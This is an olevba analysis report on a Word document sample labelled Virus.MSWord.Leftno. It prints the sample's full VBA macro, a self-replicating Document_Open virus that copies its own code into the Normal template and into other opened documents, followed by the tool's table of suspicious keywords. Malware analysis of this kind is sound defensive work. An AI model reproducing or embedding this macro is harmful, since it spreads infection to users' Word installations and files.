olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Leftno-36eb56882ba29d8c55ef33876f1b1d52d3dc818b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Leftno-36eb56882ba29d8c55ef33876f1b1d52d3dc818b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): If Left(MacroContainer, 2) = "No" Then Set H = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set NH = ActiveDocument.VBProject.VBComponents(1).CodeModule Else Set H = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set NH = NormalTemplate.VBProject.VBComponents(1).CodeModule
If NH.countoflines <> 3 Then NH.deletelines 1, NH.countoflines: S = H.lines(1, 3): NH.Addfromstring S
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

